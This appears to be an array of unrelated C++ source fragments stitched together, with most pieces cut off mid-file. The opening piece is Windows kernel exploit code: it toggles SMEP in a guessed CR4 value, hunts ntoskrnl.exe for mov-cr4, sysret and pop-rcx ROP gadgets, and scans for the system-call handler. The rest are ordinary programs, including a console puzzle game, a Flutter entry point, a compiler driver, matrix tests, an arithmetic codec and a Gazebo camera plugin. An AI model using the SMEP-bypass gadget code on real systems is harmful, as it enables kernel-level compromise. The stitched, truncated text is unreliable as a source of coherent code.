values so that they are correct\n    // (syscall handler from last exec hasnt updated CR4 with corrected m_smep_off/m_smep_on)...\n    this->exec([&](void* krnl_base, get_system_routine_t get_kroutine) -> void {});\n}\n\nauto msrexec_ctx::guess_cr4_value() -> cr4\n{\n    cpuid_eax_01 cpuid_info;\n    __cpuid((int*)&cpuid_info, 1);\n\n    cpuid_eax_07 cpuid_features;\n    __cpuid((int*)&cpuid_features, 7);\n\n    cr4 cr4_value {};\n    cr4_value.debugging_extensions = true;\n    cr4_value.page_size_extensions = true;\n    cr4_value.machine_check_enable = true;\n\n    cr4_value.physical_address_extension = cpuid_info.cpuid_feature_information_edx.physical_address_extension;\n\n    cr4_value.os_fxsave_fxrstor_support = cpuid_info.cpuid_feature_information_edx.fxsave_fxrstor_instructions;\n\n    cr4_value.os_xmm_exception_support = true;\n\n    cr4_value.fsgsbase_enable = IsProcessorFeaturePresent(PF_RDWRFSGSBASE_AVAILABLE);\n\n    cr4_value.os_xsave = IsProcessorFeaturePresent(PF_XSAVE_ENABLED);\n\n    cr4_value.pcid_enable = cpuid_info.cpuid_feature_information_ecx.process_context_identifiers;\n\n    return cr4_value;\n}\n\nauto msrexec_ctx::find_gadgets() -> bool\n{\n    m_mov_cr4_gadget = utils::rop::find_kgadget(MOV_CR4_GADGET, \"xxxx\");\n\n    if (!m_mov_cr4_gadget)\n        return {};\n\n    m_sysret_gadget = utils::rop::find_kgadget(SYSRET_GADGET, \"xxx\");\n\n    if (!m_sysret_gadget)\n        return {};\n\n    m_pop_rcx_gadget = utils::rop::find_kgadget(POP_RCX_GADGET, \"xx\");\n\n    if (!m_pop_rcx_gadget)\n        return {};\n\n    return true;\n}\n\nauto msrexec_ctx::find_globals() -> bool\n{\n    const auto [section_data, section_rva] =\n        utils::pe::get_section(reinterpret_cast<std::uintptr_t>(LoadLibraryA(\"ntoskrnl.exe\")), \".text\");\n\n    const auto ki_system_call = utils::scan(",
    "\ufeff#define _CRT_SECURE_NO_WARNINGS\n#include <iostream>\n#include <iomanip>\n#include <Windows.h>\n#include <stdio.h>  \n#include <stdlib.h>  \n#include <conio.h>  \n#include <math.h>\n#include <time.h>\n#include \"../include/cmd_console_tools.h\"\n#include \"../include/cmd_gmw_tools.h\"\nusing namespace std;\n#define NORMAL_STATE       1\n#define RELATED_STATE      2\n#define SELECTED_STATE     3\n#define BONUS              10\n\nstruct elem\n{\n\tint key;\n\tint state;//1:\u539f\u59cb\u72b6\u6001;2:\u5173\u8054\u72b6\u6001\uff08\u9009\u4e2d\u533a\u57df\uff09;3:\u9009\u4e2d\u72b6\u6001\uff081\u6b21\u56de\u8f66\u540e\uff09\n};\n\n/***************************\u51fd\u657001:\u83b7\u53d6\u884c\u5217\u6570*********************************/\nint input_rc(char ch)\n{\n\tint k;\n\tint start_x, start_y, input_x, input_y;\n\tcct_getxy(start_x, start_y);\n\tif (ch == 'r')\n\t\tcout << \"\u8bf7\u8f93\u5165\u884c\u6570(8-10):   \";\n\telse\n\t\tcout << \"\u8bf7\u8f93\u5165\u5217\u6570(8-10):   \";\n\tcct_getxy(input_x, input_y);\n\twhile (1)\n\t{\n\t\tcin >> k;\n\t\tif (cin.good() && k >= 8 && k <= 10)\n\t\t\tbreak;\n\t\telse\n\t\t{\n\t\t\tcin.clear();\n\t\t\tcin.ignore(1024, '\\n');\n\t\t\tcout << \"\u8f93\u5165\u4e0d\u5408\u6cd5\u8bf7\u91cd\u65b0\u8f93\u5165\" << endl;\n\n\t\t\tif (ch == 'r')\n\t\t\t{\n\t\t\t\tcct_gotoxy(start_x, start_y);\n\t\t\t\tcout << \"\u8bf7\u8f93\u5165\u884c\u6570(8-10):               \";\n\t\t\t\tcct_gotoxy(input_x, input_y);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcct_gotoxy(start_x, start_y);\n\t\t\t\tcout << \"\u8bf7\u8f93\u5165\u5217\u6570(8-10):               \";\n\t\t\t\tcct_gotoxy(input_x, input_y);\n\t\t\t}\n\t\t\tcontinue;\n\t\t}\n\t}\n\treturn k;\n}\n/***************************\u51fd\u657002:\u4ea7\u751f\u4e00\u4e2a0~N-1\u7684\u968f\u673a\u6570*********************************/\nint RAND(int N)//\u529f\u80fd:\u4ea7\u751f\u4e00\u4e2a0~N-1\u7684\u968f\u673a\u6570\n{\n\treturn rand() % N;\n}\n/***************************\u51fd\u657003:\u5185\u90e8\u6570\u7ec4\u521d\u59cb\u5316*********************************/\nvoid init_array(elem star[12][12], int row_num, int col_num)//\u6ce8\u610f\u5185\u90e8\u6570\u7ec4\u9996\u5143\u7d20\u4e3astar[1][1]\n{\n\tfor (int i = 0; i < 12; i++)\n\t\tfor (int j = 0; j < 12; j++)\n\t\t{\n\t\t\tstar[i][j].key = 0;\n\t\t\tstar[i][j].state = 1;\n\t\t}\n\n\tfor (int i = 1; i <= row_num; i++)\n\t\tfor (int j = 1; j <= col_num; j++)\n\t\t\tstar[i][j].key = RAND(5) + 1;\n\n}\n/***************************\u51fd\u657004:\u7bad\u5934\u79fb\u52a8\u9009\u62e9*********************************/\nvoid arrow_move(elem star[][12], int keycode2, int row_num, int col_num, int& row_now, int& col_now)\n{\n\t//\u5df2\u7ecf\u4fdd\u8bc1rc1\u7684\u503c\u975e0,\u6ce8\u610f\u8fd9\u91cc\u4f20\u5165\u7684row\u548ccol\u4e3a\u5185\u90e8\u6570\u7ec4rc,\u5373MRow+1\n\tstar[row_now + 1][col_now + 1].state = NORMAL_STATE;//\u53d6\u6d88\u5f53\u524d\u9ad8\u5149\n\tint i = 1;\n\tswitch (keycode2)\n\t{\n\tcase KB_ARROW_UP://\u5411\u4e0a\n\t\tif (star[row_now][col_now + 1].key == 0) //\u5982\u679c\u4e0a\u9762\u7684\u5143\u7d20\u4e3a0,\u8fd4\u56de\u6700\u5e95\u90e8\n\t\t\trow_now = row_num - 1;\n\t\telse\n\t\t\trow_now--;\n\t\tbreak;\n\n\tcase KB_ARROW_DOWN://\u5411\u4e0b\n\t\tif (row_now + 1 == row_num)\n\t\t{\n\t\t\tfor (int i = 1; i <= row_num; i++)\n\t\t\t\tif (star[i][col_now + 1].key != 0)\n\t\t\t\t{\n\t\t\t\t\trow_now = i - 1;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t}//\u5df2\u7ecf\u5728\u6700\u5e95\u90e8,\u5219\u627e\u5230\u8be5\u5217\u6700\u9876\u90e8\u7684\u975e\u96f6\u5143\n\t\telse\n\t\t\trow_now++;\n\t\tbreak;\n\n\tcase KB_ARROW_LEFT://\u5411\u5de6\n\t\twhile (star[row_now + 1][(col_now + col_num - i) % col_num + 1].key == 0)\n\t\t\ti++;\n\t\tcol_now = (col_now + col_num - i) % col_num;\n\t\tbreak;\n\n\tcase KB_ARROW_RIGHT://\u5411\u53f3\n\t\twhile (star[row_now + 1][(col_now + col_num + i) % col_num + 1].key == 0)\n\t\t\ti++;\n\t\tcol_now = (col_now + col_num + i) % col_num;\n\t\tbreak;\n\t}\n}\n/***************************\u51fd\u657005:\u65b9\u5757\u5168\u5c40\u7ed8\u5236*********************************/\nvoid draw_all_block(const CONSOLE_GRAPHICS_INFO* const starCGI, const int row_num, const int col_num, elem star[12][12], const BLOCK_DISPLAY_INFO* const bdi_normal, const BLOCK_DISPLAY_INFO* const bdi_selected, const BLOCK_DISPLAY_INFO* const bdi_related)\n\n{\n\tfor (int i = 0; i < row_num; i++)\n\t{\n\t\tfor (int j = 0; j < col_num; j++)\n\t\t{\n\t\t\tif (star[i + 1][j + 1].state == NORMAL_STATE)//\u6b63\u5e38\n\t\t\t\tgmw_draw_block(starCGI, i, j, star[i + 1][j + 1].key, bdi_normal);\n\t\t\telse if (star[i + 1][j + 1].state == SELECTED_STATE)//\u9009\u4e2d\n\t\t\t\tgmw_draw_block(starCGI, i, j, star[i + 1][j + 1].key, bdi_selected);\n\t\t\telse if (star[i + 1][j + 1].state == RELATED_STATE)//\u5173\u8054\n\t\t\t\tgmw_draw_block(starCGI, i, j, star[i + 1][j + 1].key, bdi_related);\n\t\t}\n\t}\n}\n/***************************\u51fd\u657006:\u67e5\u627e\u5468\u8fb9\u76f8\u7b49\u7684\u65b9\u5757,\u7f6e\u5173\u8054\u72b6\u6001*********************************/\nvoid search_sur(elem star[][12], int row, int col, int& cnt)\n{\n\tif (star[row][col].key == 0 || star[row][col].state != NORMAL_STATE)\n\t\treturn;\n\telse\n\t{\n\t\tstar[row][col].state = RELATED_STATE;\n\t\tcnt++;\n\t}\n\tif (star[row - 1][col].key == star[row][col].key)\n\t\tsearch_sur(star, row - 1, col, cnt);\n\tif (star[row + 1][col].key == star[row][col].key)\n\t\tsearch_sur(star, row + 1, col, cnt);\n\tif (star[row][col - 1].key == star[row][col].key)\n\t\tsearch_sur(star, row, col - 1, cnt);\n\tif (star[row][col + 1].key == star[row][col].key)\n\t\tsearch_sur(star, row, col + 1, cnt);\n}\n/***************************\u51fd\u657007:\u56de\u9000\u6240\u6709\u72b6\u6001,\u7f6e\u666e\u901a\u72b6\u6001*********************************/\nvoid reset_all(elem star[][12], int row_num, int col_num)\n{\n\tfor (int i = 1; i <= row_num; i++)\n\t\tfor (int j = 1; j <= col_num; j++)\n\t\t\tstar[i][j].state = NORMAL_STATE;\n}\n/***************************\u51fd\u657008:\u8fdb\u884c\u4e00\u6b21\u6d88\u9664*********************************/\nbool all_zero(elem star[][12], int row_num, int j)\n{\n\t/*\u7b2cj\u5217\u662f\u5426\u4e3a\u51680\u5217*/\n\tfor (int i = 1; i <= row_num; i++)\n\t\tif (star[i][j].key != 0)\n\t\t\treturn false;\n\treturn true;\n}\n\nint middle_zero_v(elem star[][12], int row_num, int j, int& cnt)\n{\n\t/*\u7b2cj\u5217\u662f\u5426\u5b58\u5728\u4e2d\u95f40(\u60ac\u7a7a\u5143\u7d20)?         \u4e8b\u5148\u4fdd\u8bc1\u975e\u5168\u96f6\u884c\n\t\u8fd4\u56de\u9996\u4e2a\u60ac\u7a7a\u5143\u7d20\u7684\u884c\u53f7,\u5982\u679c\u4e0d\u5b58\u5728\u8fd4\u56de-1                */\n\tfor (int i = row_num; i >= 2; i--)\n\t{\n\t\tif (star[i][j].key == 0)\n\t\t\tcnt++;\n\t\tif (star[i][j].key == 0 && star[",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_logger_example\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// Copyright (c) 2021-2024, David H. Hovemeyer <david.hovemeyer@gmail.com>\n//\n// Permission is hereby granted, free of charge, to any person obtaining a\n// copy of this software and associated documentation files (the \"Software\"),\n// to deal in the Software without restriction, including without limitation\n// the rights to use, copy, modify, merge, publish, distribute, sublicense,\n// and/or sell copies of the Software, and to permit persons to whom the\n// Software is furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included\n// in all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL\n// THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR\n// OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE,\n// ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR\n// OTHER DEALINGS IN THE SOFTWARE.\n\n#include <cstdio>\n#include <set>\n#include \"node.h\"\n#include \"ast.h\"\n#include \"parse.tab.h\"\n#include \"lex.yy.h\"\n#include \"parser_state.h\"\n#include \"unit.h\"\n#include \"semantic_analysis.h\"\n#include \"local_storage_allocation.h\"\n#include \"highlevel_codegen.h\"\n#include \"lowlevel_codegen.h\"\n#include \"highlevel_opt.h\"\n#include \"lowlevel_opt.h\"\n#include \"highlevel_formatter.h\"\n#include \"lowlevel_formatter.h\"\n#include \"print_instruction_seq.h\"\n#include \"cfg_builder.h\"\n#include \"cfg_printer.h\"\n#include \"live_vregs.h\"\n#include \"live_mregs.h\"\n#include \"exceptions.h\"\n#include \"options.h\"\n\n//! @file\n//! Driver program for `nearly_cc`.\n\nnamespace { // anonymous namespace for helper functions\n\nstruct CloseFile {\n  void operator()(FILE *in) {\n    if (in != nullptr) {\n      fclose(in);\n    }\n  }\n};\n\n// Template function to process the source file by instantiating\n// the lexer and parser. The callback function can then\n// use the lexer (and if desired, parser) to make use of the\n// contents of the source file.\ntemplate<typename Fn>\nvoid process_source_file(const std::string &filename, Fn fn) {\n  // open the input source file\n  std::unique_ptr<FILE, CloseFile> in(fopen(filename.c_str(), \"r\"));\n  if (!in) {\n    RuntimeError::raise(\"Couldn't open '%s'\", filename.c_str());\n  }\n\n  // create and initialize ParserState; note that its destructor\n  // will take responsibility for cleaning up the lexer state\n  std::unique_ptr<ParserState> pp(new ParserState);\n  pp->cur_loc = Location(filename, 1, 1);\n\n  // prepare the lexer\n  yylex_init(&pp->scan_info);\n  yyset_in(in.get(), pp->scan_info);\n\n  // make the ParserState available from the lexer state\n  yyset_extra(pp.get(), pp->scan_info);\n\n  // use the ParserState to either scan tokens or parse the input\n  // to build an AST\n  fn(pp.get());\n}\n\n// Process a source file by just reading all of the tokens\n// and adding them to a vector.\nvoid scan_tokens(const std::string &filename, std::vector<Node *> &tokens) {\n  auto callback = [&](ParserState *pp) {\n    YYSTYPE yylval;\n\n    // the lexer will store pointers to all of the allocated\n    // token objects in the ParserState, so all we need to do\n    // is call yylex() until we reach the end of the input\n    while (yylex(&yylval, pp->scan_info) != 0)\n      ;\n\n    std::copy(pp->tokens.begin(), pp->tokens.end(), std::back_inserter(tokens));\n  };\n\n  process_source_file(filename, callback);\n}\n\n// Process a source file by parsing it to produce an AST of\n// the entire translation unit. Returns a pointer to the root\n// of the AST.\nNode *parse(const std::string &filename) {\n  Node *ast = nullptr;\n\n  auto callback = [&](ParserState *pp) {\n    // parse the input source code\n    yyparse(pp);\n\n    // free memory allocated by flex\n    yylex_destroy(pp->scan_info);\n\n    ast = pp->parse_tree;\n\n    // delete any Nodes that were created by the lexer,\n    // but weren't incorporated into the parse tree\n    std::set<Node *> tree_nodes;\n    ast->preorder([&tree_nodes](Node *n) { tree_nodes.insert(n); });\n    for (auto i = pp->tokens.begin(); i != pp->tokens.end(); ++i) {\n      if (tree_nodes.count(*i) == 0) {\n        delete *i;\n      }\n    }\n  };\n\n  process_source_file(filename, callback);\n\n  return ast;\n}\n\nvoid print_tokens(const std::string &filename) {\n  std::vector<Node *> tokens;\n\n  scan_tokens(filename, tokens);\n\n  for (auto i = tokens.begin(); i != tokens.end(); ++i) {\n    Node *tok = *i;\n    printf(\"%d:%s[%s]\\n\", tok->get_tag(), get_grammar_symbol_name(tok->get_tag()), tok->get_str().c_str());\n    delete tok;\n  }\n}\n\nvoid print_symbol_tables(SemanticAnalysis &sema) {\n  // This *should* print consistent output independent of how\n  // semantic analysis is implemented, as long as\n  //\n  //   - array parameter types are converted to the corresponding pointer types\n  //   - a symbol table entry is created immediately when the semantic\n",
    "#include <cassert>\n#include <iostream>\n#include <limits>\n#include <sstream>\n#include \"matrix.h\"\n\nvoid testConstructors()\n{\n  Matrix m1;\n  assert(m1.getRows() == 0);\n  assert(m1.getColumns() == 0);\n\n  Matrix m2(2, 3, 5);\n  assert(m2.getRows() == 2);\n  assert(m2.getColumns() == 3);\n  for (size_t i = 0; i < 2; ++i) {\n    for (size_t j = 0; j < 3; ++j) {\n      assert(m2.at(i, j) == 5);\n    }\n  }\n\n  Matrix m_large(1000, 1000, 1);\n  assert(m_large.getRows() == 1000);\n  assert(m_large.getColumns() == 1000);\n  assert(m_large.at(999, 999) == 1);\n}\n\nvoid testAssignmentOperators()\n{\n  Matrix m1(2, 2, 5);\n  Matrix m2 = m1;\n  assert(m2.getRows() == m1.getRows());\n  assert(m2.getColumns() == m1.getColumns());\n  assert(m2.at(1, 1) == 5);\n\n  Matrix m3(3, 3, 10);\n  m3 = std::move(m1);\n  assert(m3.getRows() == 2 && m3.getColumns() == 2);\n  assert(m3.at(1, 1) == 5);\n\n  Matrix m_empty;\n  m_empty = m3;\n  assert(m_empty.getRows() == 2);\n  assert(m_empty.getColumns() == 2);\n  assert(m_empty.at(1, 1) == 5);\n}\n\nvoid testElementAccess()\n{\n  Matrix m(3, 3, 0);\n  m[1][1] = 10;\n  assert(m.at(1, 1) == 10);\n\n  const Matrix m_const = m;\n  assert(m_const[1][1] == 10);\n\n  try {\n    m.at(3, 3);\n    assert(false && \"Expected out_of_range exception for bounds\");\n  } catch (const std::out_of_range&) {\n  }\n\n  try {\n    m.at(-1, -1);\n    assert(false && \"Expected out_of_range exception for invalid negative index\");\n  } catch (const std::out_of_range&) {\n  }\n}\n\nvoid testModifications()\n{\n  Matrix m(3, 3, 2);\n\n  m.fill(7);\n  for (size_t i = 0; i < 3; ++i) {\n    for (size_t j = 0; j < 3; ++j) {\n      assert(m.at(i, j) == 7);\n    }\n  }\n\n  m.clear();\n  assert(m.getRows() == 0 && m.getColumns() == 0);\n  try {\n    m.at(0, 0);\n    assert(false && \"Expected exception after clear()\");\n  } catch (const std::logic_error&) {\n  }\n}\n\nvoid testInputOutput()\n{\n  Matrix m(2, 2);\n  std::istringstream is(\"1 2 3 4\");\n  m.input(is);\n  assert(m.at(0, 0) == 1);\n  assert(m.at(1, 1) == 4);\n\n  std::ostringstream os;\n  m.output(os);\n  assert(os.str() == \"1 2\\n3 4\\n\");\n\n  std::istringstream invalid_is(\"a b c d\");\n  invalid_is.exceptions(std::ios_base::failbit);\n  try {\n    m.input(invalid_is);\n    assert(false && \"Expected failure on non-numeric input\");\n  } catch (const std::ios_base::failure&) {\n  }\n}\n\nvoid testResize()\n{\n  Matrix m(2, 2, 3);\n  m.resize(3, 3);\n  assert(m.getRows() == 3 && m.getColumns() == 3);\n  assert(m.at(0, 0) == 3 && m.at(1, 1) == 3);\n\n  assert(m.at(2, 2) == 0);\n\n  m.resize(1, 1);\n  assert(m.getRows() == 1 && m.getColumns() == 1);\n  assert(m.at(0, 0) == 3);\n\n  m.resize(0, 0);\n  assert(m.getRows() == 0 && m.getColumns() == 0);\n  try {\n    m.at(0, 0);\n    assert(false && \"Expected exception when accessing elements after resize(0,0)\");\n  } catch (const std::logic_error&) {\n  }\n}\n\nvoid testLargeMatrices()\n{\n  try {\n    Matrix m(std::numeric_limits<size_t>::max(), 2);\n    assert(false && \"Expected exception for large matrix allocation\");\n  } catch (const std::bad_alloc&) {\n  }\n\n  try {\n    Matrix m2(200, std::numeric_limits<size_t>::max());\n    assert(false && \"Expected exception for large matrix allocation\");\n  } catch (const std::bad_alloc&) {\n  }\n}\n\nvoid testRandomOperations()\n{\n  Matrix m(10, 10);\n  m.fill(1);\n\n  for (size_t i = 0; i < 10; ++i) {\n    for (size_t j = 0; j < 10; ++j) {\n      m.at(i, j) = i * j;\n    }\n  }\n\n  for (size_t i = 0; i < 10; ++i) {\n    for (size_t j = 0; j < 10; ++j) {\n      assert(m.at(i, j) == static_cast<int>(i * j));\n    }\n  }\n}\n\nint main()\n{\n  testConstructors();\n  testAssignmentOperators();\n  testElementAccess();\n  testModifications();\n  testInputOutput();\n  testResize();\n  testLargeMatrices();\n  testRandomOperations();\n\n  std::cout << \"All tests passed!\" << std::endl;\n  return 0;\n}\n\n",
    "/*\nCopyright (c) 2004 Amir Said (said@ieee.org) & William A. Pearlman (pearlw@ecse.rpi.edu)\nAll rights reserved.\n\nRedistribution and use in source and binary forms, with or without modification, \nare permitted provided that the following conditions are met:\n\n-   Redistributions of source code must retain the above copyright notice, this list \n    of conditions and the following disclaimer. \n\n-   Redistributions in binary form must reproduce the above copyright notice, this list of \n    conditions and the following disclaimer in the documentation and/or other materials \n    provided with the distribution.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND ANY \nEXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF \nMERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL \nTHE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, \nSPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, \nPROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; \nOR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER \nIN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING \nIN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY \nOF SUCH DAMAGE.\n\n*/\n// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n//                                                                           -\n//                       ****************************                        -\n//                        ARITHMETIC CODING EXAMPLES                         -\n//                       ****************************                        -\n//                                                                           -\n// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n//                                                                           -\n// Fast arithmetic coding implementation                                     -\n// -> 32-bit variables, 32-bit product, periodic updates, table decoding     -\n//                                                                           -\n// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n//                                                                           -\n// Version 1.00  -  April 25, 2004                                           -\n//                                                                           -\n// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n//                                                                           -\n//                                  WARNING                                  -\n//                                 =========                                 -\n//                                                                           -\n// The only purpose of this program is to demonstrate the basic principles   -\n// of arithmetic coding. It is provided as is, without any express or        -\n// implied warranty, without even the warranty of fitness for any particular -\n// purpose, or that the implementations are correct.                         -\n//                                                                           -\n// Permission to copy and redistribute this code is hereby granted, provided -\n// that this warning and copyright notices are not removed or altered.       -\n//                                                                           -\n// Copyright (c) 2004 by Amir Said (said@ieee.org) &                         -\n//                       William A. Pearlman (pearlw@ecse.rpi.edu)           -\n//                                                                           -\n// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n//                                                                           -\n// A description of the arithmetic coding method used here is available in   -\n//                                                                           -\n// Lossless Compression Handbook, ed. K. Sayood                              -\n// Chapter 5: Arithmetic Coding (A. Said), pp. 101-152, Academic Press, 2003 -\n//                                                                           -\n// A. Said, Introduction to Arithetic Coding Theory and Practice             -\n// HP Labs report HPL-2004-76  -  http://www.hpl.hp.com/techreports/         -\n//                                                                           -\n// - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n\n\n// - - Inclusion - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n\n#include <stdlib.h>\n#include \"o3dgcArithmeticCodec.h\"\n\nnamespace o3dgc\n{\n    // - - Constants - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n\n    const unsigned AC__MinLength = 0x01000000U;   // threshol",
    "#include<Iostream>\r\n#include<vector>\r\n#include<string.h>\r\n\r\nusing namespace std;\r\n\r\nstruct Tsk \r\n{\r\n    string name;\r\n    bool completed;\r\n};\r\n\r\n\r\nvoid addTsk(vector<Tsk> & tsks) \r\n{\r\n    Tsk tsk;\r\n    cout << \"Enter tsk name: \";\r\n    cin >> tsk.name;\r\n    tsk.completed = false;\r\n    tsks.push_back(tsk);\r\n    cout << \"Tsk add successfully!\" << endl;\r\n}\r\n\r\n\r\nvoid removeTsk(vector<Tsk> & tsks) \r\n{\r\n    int tskNu;\r\n    cout << \"Enter tsk nu to remove: \";\r\n    cin >> tskNu;\r\n\r\n    if (tskNu > 0 && tskNu <= tsks.size()) \r\n    {\r\n        tsks.erase(tsks.begin() + tskNu - 1);\r\n        cout << \"Tsk del successfuly!!\" << endl;\r\n    } \r\n    else \r\n    {\r\n        cout << \"Invald tsk nu!!\" << endl;\r\n    }\r\n}\r\n\r\n\r\nvoid mrkTskComp(vector<Tsk>& tsks) \r\n{\r\n    int tskNu;\r\n    cout << \"Enter tsk nu to mrk as completed: \";\r\n    cin >> tskNu;\r\n\r\n    if (tskNu > 0 && tskNu <= tsks.size())\r\n    {\r\n        tsks[tskNu - 1].completed = true;\r\n        cout << \"Tsk mrked as comp!!\" << endl;\r\n    } \r\n    else \r\n    {\r\n        cout << \"Invald tsk nu!\" << endl;\r\n    }\r\n}\r\n\r\nvoid viewTsks(const vector<Tsk>& tsks) \r\n{\r\n    for (size_t i = 0; i < tsks.size(); ++i) \r\n    {\r\n        cout << i + 1 << \". Tsk: \" << tsks[i].name << \", Status: \" << (tsks[i].completed ? \"Completed\" : \"Pend..\") << endl;\r\n    }\r\n}\r\n\r\nint main() \r\n{\r\n    vector<Tsk> tsks;\r\n\r\n    while (true) \r\n    {\r\n        cout << \"\\n1. Add Tsk\" << endl;\r\n        cout << \"2. View Tsks\" << endl;\r\n        cout << \"3. Mrk Tsk as Completed\" << endl;\r\n        cout << \"4. Remove Tsk\" << endl;\r\n        cout << \"5. Exit\" << endl;\r\n\r\n        int choice;\r\n        cin >> choice;\r\n\r\n        switch (choice) \r\n        {\r\n            case 1:\r\n                addTsk(tsks);\r\n                break;\r\n            case 2:\r\n                viewTsks(tsks);\r\n                break;\r\n            case 3:\r\n                mrkTskComp(tsks);\r\n                break;\r\n            case 4:\r\n                removeTsk(tsks);\r\n                break;\r\n            case 5:\r\n                return 0;\r\n            default:\r\n                cout << \"Invald choice, try again\" << endl;\r\n        }\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "#include <object_camera_plugin/object_camera_plugin.hpp>\n\nnamespace gazebo\n{\n  ObjectCameraPlugin::ObjectCameraPlugin() \n  {\n    if(!rclcpp::ok())\n    {\n      rclcpp::init(0, nullptr);\n    }\n    this->ros_node_ = rclcpp::Node::make_shared(\"object_camera_plugin\");\n    RCLCPP_INFO(this->ros_node_->get_logger(), \"Object Camera Plugin node created.\");\n  }\n\n  ObjectCameraPlugin::~ObjectCameraPlugin() \n  {\n    RCLCPP_INFO(this->ros_node_->get_logger(), \"Object Camera Plugin shutting down.\");\n  }\n\n  void ObjectCameraPlugin::Load(sensors::SensorPtr _sensor, sdf::ElementPtr _sdf)\n  {\n    sdf::ElementPtr parent_sdf = _sdf->GetParent();\n    // this->PrintSDF(parent_sdf, \"\");\n\n    if (parent_sdf->HasElement(\"extension_length\"))\n    {\n      this->extension_length_ = parent_sdf->Get<double>(\"extension_length\");\n    }\n    else\n    {\n      RCLCPP_INFO(this->ros_node_->get_logger(), \"Extension length not set. Defaulting to 3m\");\n      this->extension_length_ = 3.0;\n    }\n\n    if (parent_sdf-> HasElement(\"camera\")&& parent_sdf -> GetElement(\"camera\") -> HasElement(\"horizontal_fov\"))\n    {\n      sdf::ElementPtr camera_sdf = parent_sdf -> GetElement(\"camera\");\n      this -> horizontal_fov_= camera_sdf -> Get<double>(\"horizontal_fov\");\n      RCLCPP_INFO(this->ros_node_->get_logger(), \"Horizontal FOV: %f\", this->horizontal_fov_);\n    }\n\n    if(parent_sdf-> HasElement(\"camera\")&& parent_sdf -> GetElement(\"camera\") -> HasElement(\"clip\") &&\n        parent_sdf -> GetElement(\"camera\") -> GetElement(\"clip\") -> HasElement(\"near\") &&\n        parent_sdf -> GetElement(\"camera\") -> GetElement(\"clip\") -> HasElement(\"far\"))\n    {\n      sdf::ElementPtr clip_sdf = parent_sdf -> GetElement(\"camera\")->GetElement(\"clip\");\n      this -> clip_far_ = clip_sdf -> Get<double>(\"far\");\n      this -> clip_near_ = clip_sdf -> Get<double>(\"near\");\n      RCLCPP_INFO(this->ros_node_->get_logger(), \"Clip Far: %f, Clip Near: %f\", this->clip_far_, this->clip_near_);\n    }\n\n    if(parent_sdf-> HasElement(\"pose\"))\n    {\n      this -> camera_to_base_pose_ = parent_sdf -> Get<ignition::math::Pose3d>(\"pose\");\n      RCLCPP_INFO(this->ros_node_->get_logger(), \"Camera Pose: %f, %f, %f\", this->camera_to_base_pose_.Pos().X(), this->camera_to_base_pose_.Pos().Y(), this->camera_to_base_pose_.Pos().Z());\n    }\n\n    // Get the camera sensor\n    this->camera_sensor_ = std::dynamic_pointer_cast<sensors::CameraSensor>(_sensor);\n    this->depth_camera_sensor_ = std::dynamic_pointer_cast<sensors::DepthCameraSensor>(_sensor);\n    if (!this->depth_camera_sensor_)\n    {\n      RCLCPP_ERROR(this->ros_node_->get_logger(), \"Depth Camera sensor not 